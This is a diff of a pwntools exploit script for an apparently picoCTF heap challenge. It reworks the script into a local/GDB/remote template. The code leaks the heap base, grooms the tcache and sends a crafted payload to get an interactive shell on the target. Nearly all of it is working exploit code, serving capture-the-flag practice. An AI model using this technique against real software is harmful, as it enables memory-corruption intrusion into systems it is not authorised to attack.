@@ -1,28 +1,54 @@
-#!/usr/bin/env python3
-
+#!/usr/bin/python3
 from pwn import *
+import warnings
 
-r = process('./vuln')
-#r = remote('saturn.picoctf.net', 61447)
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './vuln'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+io = start()
 
 def edit_horse(idx, data, spot):
-    r.sendlineafter(b'Choice: ', b'0')
-    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
-    r.sendlineafter(b'Enter a string of 16 characters: ', data)
-    r.sendlineafter(b'New spot? ', str(spot).encode())
+    io.sendlineafter(b'Choice: ', b'0')
+    io.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
+    io.sendlineafter(b'Enter a string of 16 characters: ', data)
+    io.sendlineafter(b'New spot? ', str(spot).encode())
 
 def add_horse(idx, size, data):
-    r.sendlineafter(b'Choice: ', b'1')
-    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
-    r.sendlineafter(b'Horse name length (16-256)? ', str(size).encode())
-    r.sendlineafter(b'characters: ', data)
+    io.sendlineafter(b'Choice: ', b'1')
+    io.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
+    io.sendlineafter(b'Horse name length (16-256)? ', str(size).encode())
+    io.sendlineafter(b'characters: ', data)
 
 def free_horse(idx):
-    r.sendlineafter(b'Choice: ', b'2')
-    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
+    io.sendlineafter(b'Choice: ', b'2')
+    io.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
 
 def race_horse():
-    r.sendlineafter(b'Choice: ', b'3')
+    io.sendlineafter(b'Choice: ', b'3')
 
 def exploit():
     # leak heap
@@ -33,10 +59,10 @@ def exploit():
     for i in range(1, 5):
         add_horse(i, 0x10, b'X' * 0x10)
     race_horse()
-    r.recvuntil(b' ')
-    heap_base = u32(r.recvn(10).strip().ljust(4, b'\x00')) << 12
-    log.info('heap_base: %#x', heap_base)
-    r.recvuntil(b'WINNER:')
+    io.recvuntil(b' ')
+    heap_base = u32(io.recvn(10).strip().ljust(4, b'\x00')) << 12
+    log.info('heap base: %#x', heap_base)
+    io.recvuntil(b'WINNER:')
     # tcache list
     add_horse(10, 0x18, b'A' * 0x18)
     add_horse(11, 0x18, b'B' * 0x18)
@@ -56,8 +82,7 @@ def exploit():
     )
     add_horse(13, 0x18, payload)
     free_horse(12)
-    #r.sendline(b'cat *lag*')
-    r.interactive()
+    io.interactive()
 
 if __name__ == '__main__':
     exploit()
